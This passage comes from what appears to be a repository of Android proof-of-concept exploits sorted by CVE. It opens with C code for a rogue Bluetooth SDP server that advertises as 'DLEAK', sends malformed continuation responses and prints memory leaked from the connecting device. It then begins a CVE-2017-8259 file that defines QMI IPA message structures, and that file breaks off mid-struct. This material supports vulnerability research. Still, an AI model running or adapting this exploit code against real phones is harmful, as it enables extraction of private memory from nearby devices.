	  printf("listen: %s", strerror(errno));
	  return -1;
	}

	return l2cap_sock;
}

static void leak_sixteenbytes(uint8_t *pkt)
{
	bt_put_be16(8, pkt);
	bt_put_be16(4, pkt);
	bt_put_be32(0xAAAAAAAA, pkt);
	bt_put_be32(0xAAAAAAAB, pkt);
	bt_put_be32(0xAAAAAAAC, pkt);
	bt_put_be32(0xAAAAAAAD, pkt);

	/* Here is the continuation */
	*pkt = 16;
	pkt++;
}

static size_t do_fake_svcsar(uint8_t *pkt)
{

	int i;
	int cnt = 8 + (count * 4);
	uint8_t *start = pkt;
	/* list byte count */
	bt_put_be16(cnt, pkt);pkt += 2;
	for (i = 0; i < cnt; i++) {
		*pkt = 0xAA;
		pkt++;
	}
	/* bad continuation */
	*pkt = 16;
	pkt++;

	printf("%zu\n", pkt-start);
	return (size_t) (pkt - start);
}

static void process_request(uint8_t *buf, int fd)
{
	sdp_pdu_hdr_t *reqhdr = (sdp_pdu_hdr_t *) buf;
	sdp_pdu_hdr_t *rsphdr;
	uint8_t *rsp = malloc(65535);
	int status = SDP_INVALID_SYNTAX;
	int send_size = 0;

	memset(rsp, 0, 65535);
	rsphdr = (sdp_pdu_hdr_t *)rsp;
	rsphdr->tid = reqhdr->tid;

	switch (reqhdr->pdu_id) {
	case SDP_SVC_SEARCH_REQ:
		printf("Got a svc srch req\n");
		leak_sixteenbytes(rsp + sizeof(sdp_pdu_hdr_t));
		rsphdr->pdu_id = SDP_SVC_SEARCH_RSP;
		rsphdr->plen = htons(21);
		send_size = 21;
		break;
	case SDP_SVC_ATTR_REQ:
		printf("Got a svc attr req\n");
		//status = service_attr_req(req, &rsp);
		rsphdr->pdu_id = SDP_SVC_ATTR_RSP;
		break;
	case SDP_SVC_SEARCH_ATTR_REQ:
		printf("Got a svc srch attr req\n");
		//status = service_search_attr_req(req, &rsp);
		rsphdr->pdu_id = SDP_SVC_SEARCH_ATTR_RSP;
		rsphdr->plen = htons(do_fake_svcsar(rsp + sizeof(sdp_pdu_hdr_t)));
		send_size = ntohs(rsphdr->plen);
		break;
	default:
		printf("Unknown PDU ID : 0x%x received", reqhdr->pdu_id);
		status = SDP_INVALID_SYNTAX;
		break;
	}
	send(fd, rsp, send_size + sizeof(sdp_pdu_hdr_t), 0);
	free(rsp);
}


static void process_leaked_bytes(uint8_t *buf, int fd)
{
	sdp_pdu_hdr_t *hdr = (sdp_pdu_hdr_t *) buf;
	uint32_t *leak, i = 0;
	/* We know our continuation is 16 bytes off the end */
	//leak = (uint32_t *) (buf + (hdr->plen) + sizeof(*hdr)));
	//printf("0x%x 0x%x 0x%x 0x%x\n", *leak, *(leak + 1), *(leak + 2), *(leak + 3));
	leak = (uint32_t *) buf + sizeof(*hdr);
	for (i = 4; i < ntohs(hdr->plen)/4; i++)
		printf("%x ", leak[i]);
	printf("\n");
}

static void *l2cap_data_thread(void *input)
{
	int fd = *(int *)input;
	sdp_pdu_hdr_t hdr;
	uint8_t *buf;
	int len, size;

	while (true) {
		len = recv(fd, &hdr, sizeof(sdp_pdu_hdr_t), MSG_PEEK);
		if (len < 0 || (unsigned int) len < sizeof(sdp_pdu_hdr_t)) {
			continue;
		}

		size = sizeof(sdp_pdu_hdr_t) + ntohs(hdr.plen);
		buf = malloc(size);
		if (!buf)
			continue;

		printf("%s: trying to recv %d\n", __func__, size);
		len = recv(fd, buf, size, 0);
		if (len <= 0) {
			free(buf);
			continue;
		}

		if (!count) {
			process_request(buf, fd);
			count ++;
		}
		if (count >= 1) {
			process_leaked_bytes(buf, fd);
			process_request(buf, fd);
			count++;
		}

		free(buf);
	}
}

/* derived from hciconfig.c */
static void *advertiser(void *unused)
{
	uint8_t status;
	int device_id, handle;
	struct hci_request req = { 0 };
	le_set_advertise_enable_cp acp = { 0 };
	le_set_advertising_parameters_cp avc = { 0 };
	le_set_advertising_data_cp data = { 0 };

	device_id = hci_get_route(NULL);

	if (device_id < 0) {
		printf("%s: Failed to get route: %s\n", __func__, strerror(errno));
		return NULL;
	}
	handle = hci_open_dev(hci_get_route(NULL));
	if (handle < 0) {
		printf("%s: Failed to open and aquire handle: %s\n", __func__, strerror(errno));
		return NULL;
	}

	avc.min_interval = avc.max_interval = htobs(150);
	avc.chan_map = 7;
	req.ogf = OGF_LE_CTL;
	req.ocf = OCF_LE_SET_ADVERTISING_PARAMETERS;
	req.cparam = &avc;
	req.clen = LE_SET_ADVERTISING_PARAMETERS_CP_SIZE;
	req.rparam = &status;
	req.rlen = 1;

	if (hci_send_req(handle, &req, 1000) < 0) {
		hci_close_dev(handle);
		printf("%s: Failed to send request %s\n", __func__, strerror(errno));
		return NULL;
	}
	memset(&req, 0, sizeof(req));
	req.ogf = OGF_LE_CTL;
	req.ocf = OCF_LE_SET_ADVERTISE_ENABLE;
	req.cparam = &acp;
	req.clen = LE_SET_ADVERTISE_ENABLE_CP_SIZE;
	req.rparam = &status;
	req.rlen = 1;

	data.data[0] = htobs(2);
	data.data[1] = htobs(EIR_FLAGS);
	data.data[2] = htobs(EIR_GEN_DISC | EIR_LIM_DISC);

	data.data[3] = htobs(6);
	data.data[4] = htobs(EIR_NAME_COMPLETE);
	data.data[5] = 'D';
	data.data[6] = 'L';
	data.data[7] = 'E';
	data.data[8] = 'A';
	data.data[9] = 'K';

	data.length = 10;

	memset(&req, 0, sizeof(req));
	req.ogf = OGF_LE_CTL;
	req.ocf = OCF_LE_SET_ADVERTISING_DATA;
	req.cparam = &data;
	req.clen = LE_SET_ADVERTISING_DATA_CP_SIZE;
	req.rparam = &status;
	req.rlen = 1;

	if (hci_send_req(handle, &req, 1000) < 0) {
		hci_close_dev(handle);
		printf("%s: Failed to send request %s\n", __func__, strerror(errno));
		return NULL;
	}
	printf("Device should be advertising under DLEAK\n");
}



int main(int argc, char **argv)
{
	pthread_t *io_channel;
	pthread_t adv;
	int       fds[16];
	const int io_chans = 16;
	struct sockaddr_l2 addr;
	socklen_t qlen = sizeof(addr);
	socklen_t len = sizeof(addr);
	int l2cap_sock;
	int i;


	pthread_create(&adv, NULL, advertiser, NULL);
	l2cap_sock = init_server(652);
	if (l2cap_sock < 0)
		return EXIT_FAILURE;

	io_channel = malloc(io_chans * sizeof(*io_channel));
	if (!io_channel)
		return EXIT_FAILURE;

	for (i = 0; i < io_chans; i++) {
		printf("%s: Going to accept on io chan %d\n", __func__, i);
		fds[i] = accept(l2cap_sock, (struct sockaddr *) &addr, &len);
		if (fds[i] < 0) {
			i--;
			printf("%s: Accept failed with %s\n", __func__, strerror(errno));
			continue;
		}
		printf("%s: accepted\n", __func__);
		pthread_create(&io_channel[i], NULL, l2cap_data_thread, &fds[i]);
	}
}

```

`CVE-2017-8259/ipa_qmi_service.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <fcntl.h>
#include <stdbool.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <net/if.h>
#include "qmi_encdec.h"
//#include <random.h>

#define QMI_COMMON_TLV_TYPE 0

#define AF_MSM_IPC 27
#define IPA_A5_SERVICE_SVC_ID 0x31
#define IPA_A5_SERVICE_INS_ID 1
#define IPA_A5_SVC_VERS 1

#define QMI_IPA_INSTALL_FILTER_RULE_REQ_V01 0x0023
#define QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01 22369
#define QMI_IPA_MAX_FILTERS_V01 64

#ifndef IPA_QMI_SERVICE_V01_H
#define IPA_QMI_SERVICE_V01_H

#define QMI_IPA_IPFLTR_NUM_IHL_RANGE_16_EQNS_V01 2
#define QMI_IPA_IPFLTR_NUM_MEQ_32_EQNS_V01 2
#define QMI_IPA_IPFLTR_NUM_IHL_MEQ_32_EQNS_V01 2
#define QMI_IPA_IPFLTR_NUM_MEQ_128_EQNS_V01 2
#define QMI_IPA_MAX_FILTERS_V01 64
#define QMI_IPA_MAX_PIPES_V01 20
#define QMI_IPA_MAX_APN_V01 8

#define IPA_INT_MAX	((int)(~0U>>1))
#define IPA_INT_MIN	(-IPA_INT_MAX - 1)

/* IPA definition as msm_qmi_interface.h */

enum ipa_qmi_result_type_v01 {
	/* To force a 32 bit signed enum. Do not change or use*/
	IPA_QMI_RESULT_TYPE_MIN_ENUM_VAL_V01 = IPA_INT_MIN,
	IPA_QMI_RESULT_SUCCESS_V01 = 0,
	IPA_QMI_RESULT_FAILURE_V01 = 1,
	IPA_QMI_RESULT_TYPE_MAX_ENUM_VAL_V01 = IPA_INT_MAX,
};

enum ipa_qmi_error_type_v01 {
	/* To force a 32 bit signed enum. Do not change or use*/
	IPA_QMI_ERROR_TYPE_MIN_ENUM_VAL_V01 = IPA_INT_MIN,
	IPA_QMI_ERR_NONE_V01 = 0x0000,
	IPA_QMI_ERR_MALFORMED_MSG_V01 = 0x0001,
	IPA_QMI_ERR_NO_MEMORY_V01 = 0x0002,
	IPA_QMI_ERR_INTERNAL_V01 = 0x0003,
	IPA_QMI_ERR_CLIENT_IDS_EXHAUSTED_V01 = 0x0005,
	IPA_QMI_ERR_INVALID_ID_V01 = 0x0029,
	IPA_QMI_ERR_ENCODING_V01 = 0x003A,
	IPA_QMI_ERR_INCOMPATIBLE_STATE_V01 = 0x005A,
	IPA_QMI_ERR_NOT_SUPPORTED_V01 = 0x005E,
	IPA_QMI_ERROR_TYPE_MAX_ENUM_VAL_V01 = IPA_INT_MAX,
};





struct ipa_qmi_response_type_v01 {
	enum ipa_qmi_result_type_v01 result;
	enum ipa_qmi_error_type_v01 error;
};

enum ipa_platform_type_enum_v01 {
	IPA_PLATFORM_TYPE_ENUM_MIN_ENUM_VAL_V01 =
	-2147483647, /* To force a 32 bit signed enum.  Do not change or use */
	QMI_IPA_PLATFORM_TYPE_INVALID_V01 = 0,
	/*  Invalid platform identifier */
	QMI_IPA_PLATFORM_TYPE_TN_V01 = 1,
	/*  Platform identifier -	Data card device */
	QMI_IPA_PLATFORM_TYPE_LE_V01 = 2,
	/*  Platform identifier -	Data router device */
	QMI_IPA_PLATFORM_TYPE_MSM_ANDROID_V01 = 3,
	/*  Platform identifier -	MSM device with Android HLOS */
	QMI_IPA_PLATFORM_TYPE_MSM_WINDOWS_V01 = 4,
	/*  Platform identifier -	MSM device with Windows HLOS */
	QMI_IPA_PLATFORM_TYPE_MSM_QNX_V01 = 5,
	/*  Platform identifier -	MSM device with QNX HLOS */
	IPA_PLATFORM_TYPE_ENUM_MAX_ENUM_VAL_V01 = 2147483647
	/* To force a 32 bit signed enum.  Do not change or use */
};

struct ipa_hdr_tbl_info_type_v01 {
	uint32_t modem_offset_start;
	/*	Offset from the start of IPA Shared memory from which
	 *	modem driver may insert header table entries.
	 */
	uint32_t modem_offset_end;
	/*	Offset from the start of IPA shared mem beyond which modem
	 *	driver shall not insert header table entries. The space
	 *	available for the modem driver shall include the
	 *	modem_offset_start and modem_offset_end.
	 */
};  /* Type */

struct ipa_route_tbl_info_type_v01 {
	uint32_t route_tbl_start_addr;
	/*	Identifies the start of the routing table. Denotes the offset
	 *	from the start of the IPA Shared Mem
	 */

	uint32_t num_indices;
	/*	Number of indices (starting from 0) that is being allocated to
	 *	the modem. The number indicated here is also included in the
	 *	allocation. The value of num_indices shall not exceed 31
	 *	(5 bits used to specify the routing table index), unless there
	 *	is a change in the hardware.
	 */
};  /* Type */

struct ipa_modem_mem_info_type_v01 {

	uint32_t block_start_addr;
	/*	Identifies the start of the memory block allocated for the
	 *	modem. Denotes the offset from the start of the IPA Shared Mem
	 */

	uint32_t size;
	/*	Size of the block allocated for the modem driver */
};  /* Type */

struct ipa_hdr_proc_ctx_tbl_info_type_v01 {

	uint32_t modem_offset_start;
	/*  Offset from the start of IPA shared memory from which the modem
	 *	driver may insert header processing context table entries.
	 */

	uint32_t modem_offset_end;
	/*  Offset from the start of IPA shared memory beyond which the modem
	 *	driver may not insert header proc table entries. The space
	 *	available for the modem driver includes modem_offset_start and
	 *	modem_offset_end.
	 */
};  /* Type */

struct ipa_zip_tbl_info_type_v01 {

	uint32_t modem_offset_start;
	/*  Offset from the start of IPA shared memory from which the modem
	 *	driver may insert compression/decompression command entries.
	 */

	uint32_t modem_offset_end;
	/*  Offset from the start of IPA shared memory beyond which the modem
	 *	driver may not insert compression/decompression command entries.
	 *	The space available for the modem driver includes
	 *  modem_offset_start and modem_offset_end.
	 */
};  /* Type */

/**
 * Request Message; Requests the modem IPA driver
 * to perform initializtion
 */
struct ipa_init_modem_driver_req_msg_v01 {

	/* Optional */
	/*  Platform info */
	uint8_t platform_type_valid;  /**< Must be set to true if platform_type
	is being passed */
	enum ipa_platform_type_enum_v01 platform_type;
	/*   Provides information about the platform (ex. TN/MN/LE/MSM,etc) */

	/* Optional */
	/*  Header table info */
	uint8_t hdr_tbl_info_valid;
	/* Must be set to true if hdr_tbl_info is being passed */
	struct ipa_hdr_tbl_info_type_v01 hdr_tbl_info;
	/*	Provides information about the header table */

	/* Optional */
	/*  IPV4 Routing table info */
	uint8_t v4_route_tbl_info_valid;
	/* Must be set to true if v4_route_tbl_info is being passed */
	struct ipa_route_tbl_info_type_v01 v4_route_tbl_info;
	/*	Provides information about the IPV4 routing table */

	/* Optional */
	/*  IPV6 Routing table info */
	uint8_t v6_route_tbl_info_valid;  /**< Must be set to true if
	v6_route_tbl_info is being passed */
	struct ipa_route_tbl_info_type_v01 v6_route_tbl_info;
	/*	Provides information about the IPV6 routing table */

	/* Optional */
	/*  IPV4 Filter table start address */
	uint8_t v4_filter_tbl_start_addr_valid;  /**< Must be set to true
	if v4_filter_tbl_start_addr is being passed */
	uint32_t v4_filter_tbl_start_addr;
	/*	Provides information about the starting address of IPV4 filter
	 *	table in IPAv2 or non-hashable IPv4 filter table in IPAv3.
	 *	Denotes the offset from the start of the IPA Shared Mem
	 */

	/* Optional */
	/* IPV6 Filter table start address */
	uint8_t v6_filter_tbl_start_addr_valid;
	/* Must be set to true if v6_filter_tbl_start_addr is being passed */
	uint32_t v6_filter_tbl_start_addr;
	/*	Provides information about the starting address of IPV6 filter
	 *	table in IPAv2 or non-hashable IPv6 filter table in IPAv3.
	 *	Denotes the offset from the start of the IPA Shared Mem
	 */

	/* Optional */
	/*  Modem memory block */
	uint8_t modem_mem_info_valid;
	/* Must be set to true if modem_mem_info is being passed */
	struct ipa_modem_mem_info_type_v01 modem_mem_info;
	/*  Provides information about the start address and the size of
	 *	the memory block that is being allocated to the modem driver.
	 *	Denotes the physical address
	 */

	/* Optional */
	/*  Destination end point for control commands from modem */
	uint8_t ctrl_comm_dest_end_pt_valid;  /**< Must be set to true if
	ctrl_comm_dest_end_pt is being passed */
	uint32_t ctrl_comm_dest_end_pt;
	/*  Provides information about the destination end point on the
	 *	application processor to which the modem driver can send
	 *	control commands. The value of this parameter cannot exceed
	 *	19 since IPA only supports 20 end points.
	 */

	/* Optional */
	/*  Modem Bootup Information */
	uint8_t is_ssr_bootup_valid;  /**< Must be set to true if
	is_ssr_bootup is being passed */
	uint8_t is_ssr_bootup;
	/*	Specifies whether the modem is booting up after a modem only
	 *	sub-system restart or not. This will let the modem driver
	 *	know that it doesn't have to reinitialize some of the HW
	 *	blocks because IPA has not been reset since the previous
	 *	initialization.
	 */

	/* Optional */
	/*  Header Processing Context Table Information */
	uint8_t hdr_proc_ctx_tbl_info_valid;
	/* Must be set to true if hdr_proc_ctx_tbl_info is being passed */
	struct ipa_hdr_proc_ctx_tbl_info_type_v01 hdr_proc_ctx_tbl_info;
	/* Provides information about the header processing context table.
	*/

	/* Optional */
	/*  Compression Decompression Table Information */
	uint8_t zip_tbl_info_valid;
	/* Must be set to true if zip_tbl_info is being passed */
	struct ipa_zip_tbl_info_type_v01 zip_tbl_info;
	/* Provides information about the zip table.
	*/

	/* Optional */
	/*  IPv4 Hashable Routing Table Information */
	/** Must be set to true if v4_hash_route_tbl_info is being passed */
	uint8_t v4_hash_route_tbl_info_valid;
	struct ipa_route_tbl_info_type_v01 v4_hash_route_tbl_info;

	/* Optional */
	/*  IPv6 Hashable Routing Table Information */
	/** Must be set to true if v6_hash_route_tbl_info is being passed */
	uint8_t v6_hash_route_tbl_info_valid;
	struct ipa_route_tbl_info_type_v01 v6_hash_route_tbl_info;

	/* Optional */
	/*  IPv4 Hashable Filter Table Start Address */
	/** Must be set to true if v4_hash_filter_tbl_start_addr
	    is being passed */
	uint8_t v4_hash_filter_tbl_start_addr_valid;
	uint32_t v4_hash_filter_tbl_start_addr;
	/**	Identifies the starting address of the IPv4 hashable filter
	    table in IPAv3 onwards. Denotes the offset from the start of
		the IPA shared memory.
	*/

	/* Optional */
	/*  IPv6 Hashable Filter Table Start Address */
	/** Must be set to true if v6_hash_filter_tbl_start_addr
	    is being passed */
	uint8_t v6_hash_filter_tbl_start_addr_valid;
	uint32_t v6_hash_filter_tbl_start_addr;
	/**	Identifies the starting address of the IPv6 hashable filter
	    table in IPAv3 onwards. Denotes the offset from the start of
		the IPA shared memory.
	*/
};  /* Message */

/* Response Message; Requests the modem IPA driver about initialization */
struct ipa_init_modem_driver_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/* Standard response type.*/

	/* Optional */
	/* Destination end point for control commands from master driver */
	uint8_t ctrl_comm_dest_end_pt_valid;
	/* Must be set to true if ctrl_comm_dest_ep is being passed */
	uint32_t ctrl_comm_dest_end_pt;
	/*	Provides information about the destination end point on the
	 *	modem processor to which the master driver can send control
	 *	commands. The value of this parameter cannot exceed 19 since
	 *	IPA only supports 20 end points. This field is looked at only
	 *	if the result in TLV RESULT_CODE is	QMI_RESULT_SUCCESS
	 */

	/* Optional */
	/*  Default end point */
	uint8_t default_end_pt_valid;
	/* Must be set to true if default_end_pt is being passed */
	uint32_t default_end_pt;
	/*  Provides information about the default end point. The master
	 *	driver may or may not set the register in the hardware with
	 *	this value. The value of this parameter cannot exceed 19
	 *	since IPA only supports 20 end points. This field is looked
	 *	at only if the result in TLV RESULT_CODE is QMI_RESULT_SUCCESS
	 */

	/* Optional */
	/*  Modem Driver Initialization Pending */
	uint8_t modem_driver_init_pending_valid;
	/* Must be set to true if modem_driver_init_pending is being passed */
	uint8_t modem_driver_init_pending;
	/*
	 * Identifies if second level message handshake is needed
	 *	between drivers to indicate when IPA HWP loading is completed.
	 *	If this is set by modem driver, AP driver will need to wait
	 *	for a INIT_MODEM_DRIVER_CMPLT message before communicating with
	 *	IPA HWP.
	 */
};  /* Message */

/*
 * Request Message; Request from Modem IPA driver to indicate
 *	modem driver init completion
 */
struct ipa_init_modem_driver_cmplt_req_msg_v01 {
	/* Mandatory */
	/*  Modem Driver init complete status; */
	uint8_t status;
	/*
	 * Specifies whether the modem driver initialization is complete
	 *	including the micro controller image loading.
	 */
};  /* Message */

/*
 * Response Message; Request from Modem IPA driver to indicate
 *	modem driver init completion
 */
struct ipa_init_modem_driver_cmplt_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/**<   Standard response type.*/
};  /* Message */

/*	Request Message; This is the message that is exchanged between the
 *	control point and the service in order to register for indications.
 */
struct ipa_indication_reg_req_msg_v01 {
	/* Optional */
	/*  Master driver initialization completion */
	uint8_t master_driver_init_complete_valid;
	/* Must be set to true if master_driver_init_complete is being passed */
	uint8_t master_driver_init_complete;
	/*  If set to TRUE, this field indicates that the client is
	 *	interested in getting indications about the completion
	 *	of the initialization sequence of the master driver.
	 *	Setting this field in the request message makes sense
	 *	only when the QMI_IPA_INDICATION_REGISTER_REQ is being
	 *	originated from the modem driver
	 */

	/* Optional */
	/*  Data Usage Quota Reached */
	uint8_t data_usage_quota_reached_valid;
	/*  Must be set to true if data_usage_quota_reached is being passed */
	uint8_t data_usage_quota_reached;
	/*  If set to TRUE, this field indicates that the client wants to
	 *  receive indications about reaching the data usage quota that
	 *  previously set via QMI_IPA_SET_DATA_USAGE_QUOTA. Setting this field
	 *  in the request message makes sense only when the
	 *  QMI_IPA_INDICATION_REGISTER_REQ is being originated from the Master
	 *  driver
	 */
};  /* Message */


/* Response Message; This is the message that is exchanged between the
 *	control point and the service in order to register for indications.
 */
struct ipa_indication_reg_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/**<   Standard response type.*/
};  /* Message */


/*	Indication Message; Indication sent to the Modem IPA driver from
 *	master IPA driver about initialization being complete.
 */
struct ipa_master_driver_init_complt_ind_msg_v01 {
	/* Mandatory */
	/*  Master driver initialization completion status */
	struct ipa_qmi_response_type_v01 master_driver_init_status;
	/*	Indicates the status of initialization. If everything went
	 *	as expected, this field is set to SUCCESS. ERROR is set
	 *	otherwise. Extended error info may be used to convey
	 *	additional information about the error
	 */
};  /* Message */

struct ipa_ipfltr_range_eq_16_type_v01 {
	uint8_t offset;
	/*	Specifies the offset from the IHL (Internet Header length) */

	uint16_t range_low;
	/*	Specifies the lower bound of the range */

	uint16_t range_high;
	/*	Specifies the upper bound of the range */
};  /* Type */

struct ipa_ipfltr_mask_eq_32_type_v01 {
	uint8_t offset;
	/*	Specifies the offset either from IHL or from the start of
	 *	the IP packet. This depends on the equation that this structure
	 *	is used in.
	 */

	uint32_t mask;
	/*	Specifies the mask that has to be used in the comparison.
	 *	The field is ANDed with the mask and compared against the value.
	 */

	uint32_t value;
	/*	Specifies the 32 bit value that used in the comparison. */
};  /* Type */

struct ipa_ipfltr_eq_16_type_v01 {
	uint8_t offset;
	/*  Specifies the offset into the packet */

	uint16_t value;
	/* Specifies the 16 bit value that should be used in the comparison. */
};  /* Type */

struct ipa_ipfltr_eq_32_type_v01 {
	uint8_t offset;
	/* Specifies the offset into the packet */

	uint32_t value;
	/* Specifies the 32 bit value that should be used in the comparison. */
};  /* Type */

struct ipa_ipfltr_mask_eq_128_type_v01 {
	uint8_t offset;
	/* Specifies the offset into the packet */

	uint8_t mask[16];
	/*  Specifies the mask that has to be used in the comparison.
	 *	The field is ANDed with the mask and compared against the value.
	 */

	uint8_t value[16];
	/* Specifies the 128 bit value that should be used in the comparison. */
};  /* Type */


struct ipa_filter_rule_type_v01 {
	uint16_t rule_eq_bitmap;
	/* 16-bit Bitmask to indicate how many eqs are valid in this rule */

	uint8_t tos_eq_present;
	/* Specifies if a type of service check rule is present */

	uint8_t tos_eq;
	/* The value to check against the type of service (ipv4) field */

	uint8_t protocol_eq_present;
	/* Specifies if a protocol check rule is present */

	uint8_t protocol_eq;
	/* The value to check against the protocol field */

	uint8_t num_ihl_offset_range_16;
	/*  The number of 16 bit range check rules at the location
	 *	determined by IP header length plus a given offset offset
	 *	in this rule. See the definition of the ipa_filter_range_eq_16
	 *	for better understanding. The value of this field cannot exceed
	 *	IPA_IPFLTR_NUM_IHL_RANGE_16_EQNS which is set as 2
	 */

	struct ipa_ipfltr_range_eq_16_type_v01
		ihl_offset_range_16[QMI_IPA_IPFLTR_NUM_IHL_RANGE_16_EQNS_V01];
	/*	Array of the registered IP header length offset 16 bit range
	 *	check rules.
	 */

	uint8_t num_offset_meq_32;
	/*  The number of 32 bit masked comparison rules present
	 *  in this rule
	 */

	struct ipa_ipfltr_mask_eq_32_type_v01
		offset_meq_32[QMI_IPA_IPFLTR_NUM_MEQ_32_EQNS_V01];
	/*  An array of all the possible 32bit masked comparison rules
	 *	in this rule
	 */

	uint8_t tc_eq_present;
	/*  Specifies if the traffic class rule is present in this rule */

	uint8_t tc_eq;
	/* The value against which the IPV4 traffic class field has to
		be checked */

	uint8_t flow_eq_present;
	/* Specifies if the "flow equals" rule is present in this rule */

	uint32_t flow_eq;
	/* The value against which the IPV6 flow field has to be checked */

	uint8_t ihl_offset_eq_16_present;
	/*	Specifies if there is a 16 bit comparison required at the
	 *	location in	the packet determined by "Intenet Header length
	 *	+ specified offset"
	 */

	struct ipa_ipfltr_eq_16_type_v01 ihl_offset_eq_16;
	/* The 16 bit comparison equation */

	uint8_t ihl_offset_eq_32_present;
	/*	Specifies if there is a 32 bit comparison required at the
	 *	location in the packet determined by "Intenet Header length
	 *	+ specified offset"
	 */

	struct ipa_ipfltr_eq_32_type_v01 ihl_offset_eq_32;
	/*	The 32 bit comparison equation */

	uint8_t num_ihl_offset_meq_32;
	/*	The number of 32 bit masked comparison equations in this
	 *	rule. The location of the packet to be compared is
	 *	determined by the IP Header length + the give offset
	 */

	struct ipa_ipfltr_mask_eq_32_type_v01
		ihl_offset_meq_32[QMI_IPA_IPFLTR_NUM_IHL_MEQ_32_EQNS_V01];
	/*	Array of 32 bit masked comparison equations.
	*/

	uint8_t num_offset_meq_128;
	/*	The number of 128 bit comparison equations in this rule */

	struct ipa_ipfltr_mask_eq_128_type_v01
		offset_meq_128[QMI_IPA_IPFLTR_NUM_MEQ_128_EQNS_V01];
	/*	Array of 128 bit comparison equations. The location in the
	 *	packet is determined by the specified offset
	 */

	uint8_t metadata_meq32_present;
	/*  Boolean indicating if the 32 bit masked comparison equation
	 *	is present or not. Comparison is done against the metadata
	 *	in IPA. Metadata can either be extracted from the packet
	 *	header or from the "metadata" register.
	 */

	struct ipa_ipfltr_mask_eq_32_type_v01
			metadata_meq32;
	/* The metadata  32 bit masked comparison equation */

	uint8_t ipv4_frag_eq_present;
	/* Specifies if the IPv4 Fragment equation is present in this rule */
};  /* Type */


enum ipa_ip_type_enum_v01 {
	IPA_IP_TYPE_ENUM_MIN_ENUM_VAL_V01 = -2147483647,
	/* To force a 32 bit signed enum.  Do not change or use*/
	QMI_IPA_IP_TYPE_INVALID_V01 = 0,
	/*  Invalid IP type identifier */
	QMI_IPA_IP_TYPE_V4_V01 = 1,
	/*  IP V4 type */
	QMI_IPA_IP_TYPE_V6_V01 = 2,
	/*  IP V6 type */
	QMI_IPA_IP_TYPE_V4V6_V01 = 3,
	/*  Applies to both IP types */
	IPA_IP_TYPE_ENUM_MAX_ENUM_VAL_V01 = 2147483647
	/* To force a 32 bit signed enum.  Do not change or use*/
};


enum ipa_filter_action_enum_v01 {
	IPA_FILTER_ACTION_ENUM_MIN_ENUM_VAL_V01 = -2147483647,
	/* To force a 32 bit signed enum. Do not change or use */
	QMI_IPA_FILTER_ACTION_INVALID_V01 = 0,
	/*  Invalid action on filter hit */
	QMI_IPA_FILTER_ACTION_SRC_NAT_V01 = 1,
	/*  Pass packet to NAT block for Source NAT */
	QMI_IPA_FILTER_ACTION_DST_NAT_V01 = 2,
	/*  Pass packet to NAT block for Destination NAT */
	QMI_IPA_FILTER_ACTION_ROUTING_V01 = 3,
	/*  Pass packet to Routing block */
	QMI_IPA_FILTER_ACTION_EXCEPTION_V01 = 4,
	/*  Treat packet as exception and send to exception pipe */
	IPA_FILTER_ACTION_ENUM_MAX_ENUM_VAL_V01 = 2147483647
	/* To force a 32 bit signed enum.  Do not change or use*/
};

struct ipa_filter_spec_type_v01 {
	uint32_t filter_spec_identifier;
	/*	This field is used to identify a filter spec in the list
	 *	of filter specs being sent from the client. This field
	 *	is applicable only in the filter install request and response.
	 */

	enum ipa_ip_type_enum_v01 ip_type;
	/*	This field identifies the IP type for which this rule is
	 *	applicable. The driver needs to identify the filter table
	 *	(V6 or V4) and this field is essential for that
	 */

	struct ipa_filter_rule_type_v01 filter_rule;
	/*	This field specifies the rules in the filter spec. These rules
	 *	are the ones that are matched against fields in the packet.
	 */

	enum ipa_filter_action_enum_v01 filter_action;
	/*	This field specifies the action to be taken when a filter match
	 *	occurs. The remote side should install this information into the
	 *	hardware along with the filter equations.
	 */

	uint8_t is_routing_table_index_valid;
	/*	Specifies whether the routing table index is present or not.
	 *	If the action is "QMI_IPA_FILTER_ACTION_EXCEPTION", this
	 *	parameter need not be provided.
	 */

	uint32_t route_table_index;
	/*	This is the index in the routing table that should be used
	 *	to route the packets if the filter rule is hit
	 */

	uint8_t is_mux_id_valid;
	/*	Specifies whether the mux_id is valid */

	uint32_t mux_id;
	/*	This field identifies the QMAP MUX ID. As a part of QMAP
	 *	protocol, several data calls may be multiplexed over the
	 *	same physical transport channel. This identifier is used to
	 *	identify one such data call. The maximum value for this
	 *	identifier is 255.
	 */
};  /* Type */

struct ipa_filter_spec_ex_type_v01 {
	enum ipa_ip_type_enum_v01 ip_type;
	/*	This field identifies the IP type for which this rule is
	 *	applicable. The driver needs to identify the filter table
	 *	(V6 or V4) and this field is essential for that
	 */

	struct ipa_filter_rule_type_v01 filter_rule;
	/*	This field specifies the rules in the filter spec. These rules
	 *	are the ones that are matched against fields in the packet.
	 */

	enum ipa_filter_action_enum_v01 filter_action;
	/*	This field specifies the action to be taken when a filter match
	 *	occurs. The remote side should install this information into the
	 *	hardware along with the filter equations.
	 */

	uint8_t is_routing_table_index_valid;
	/*	Specifies whether the routing table index is present or not.
	 *	If the action is "QMI_IPA_FILTER_ACTION_EXCEPTION", this
	 *	parameter need not be provided.
	 */

	uint32_t route_table_index;
	/*	This is the index in the routing table that should be used
	 *	to route the packets if the filter rule is hit
	 */

	uint8_t is_mux_id_valid;
	/*	Specifies whether the mux_id is valid */

	uint32_t mux_id;
	/*	This field identifies the QMAP MUX ID. As a part of QMAP
	 *	protocol, several data calls may be multiplexed over the
	 *	same physical transport channel. This identifier is used to
	 *	identify one such data call. The maximum value for this
	 *	identifier is 255.
	 */

	uint32_t rule_id;
	/** Rule Id of the given filter. The Rule Id is populated in the rule
		header when installing the rule in IPA.
	*/

	uint8_t is_rule_hashable;
	/** Specifies whether the given rule is hashable.
	*/
};  /* Type */


/*  Request Message; This is the message that is exchanged between the
 *	control point and the service in order to request the installation
 *	of filtering rules in the hardware block by the remote side.
 */
struct ipa_install_fltr_rule_req_msg_v01 {
	/* Optional */
	/*  IP type that this rule applies to
